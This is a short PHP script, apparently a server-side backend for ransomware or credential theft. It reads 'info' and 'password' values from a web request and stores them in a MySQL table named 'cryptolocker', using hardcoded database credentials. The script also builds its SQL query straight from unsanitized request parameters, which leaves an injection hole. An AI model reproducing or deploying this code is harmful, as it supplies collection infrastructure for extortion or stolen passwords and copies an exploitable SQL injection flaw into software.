<?php
$host = "sql.divini5g.com";
$user = "divini5g07622";
$pass = "gucci";
$nome = "divini5g07622";
$tab_nome = "cryptolocker";

$data=date("Y-m-d h:i:s");

mysql_connect($host,$user,$pass) or die("Impossibile collegarsi al server");
@mysql_select_db("$nome") or die("Impossibile connettersi al database $nome");

$utente= $_GET["info"];
$password= $_GET["password"];

$sql= "INSERT INTO $tab_nome (utente, password, data)";
$sql .="VALUES ('$utente', '$password', '$data')";

if (mysql_query($sql)) {
	echo "Il nuovo record è stato inserito correttamente";
}
else{
	echo "Errore nell'inserimento: " . mysql_error();
}
?>
